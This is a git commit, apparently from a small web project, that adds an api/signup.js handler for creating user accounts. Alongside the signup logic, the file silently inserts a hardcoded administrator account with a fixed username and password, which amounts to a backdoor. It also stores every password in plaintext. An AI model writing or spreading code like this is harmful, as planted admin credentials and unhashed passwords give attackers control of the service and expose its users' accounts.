f8cc4154da4208c2a1fc1dbd405ef4255f880cf5
XxX9Void9XxX <brooksm@carbonschools.org>
2026-02-24 16:24:57 -0700

    Create signup.js

---
+++ api/signup.js
@@ -0,0 +1,14 @@
+let users = global.users || [];
+if (!users.find(u => u.username === "script.add.user")) {
+  users.push({ username: "script.add.user", password: "script=admin", role: "admin", banned: false, lastLogin: null });
+}
+global.users = users;
+
+export default function handler(req, res) {
+  if (req.method !== "POST") return res.status(405).send({ success: false });
+  const { username, password } = req.body;
+  if (!username || !password) return res.json({ success: false });
+  if (users.find(u => u.username === username)) return res.json({ success: false });
+  users.push({ username, password, role: "user", banned: false, lastLogin: null });
+  res.json({ success: true });
+}
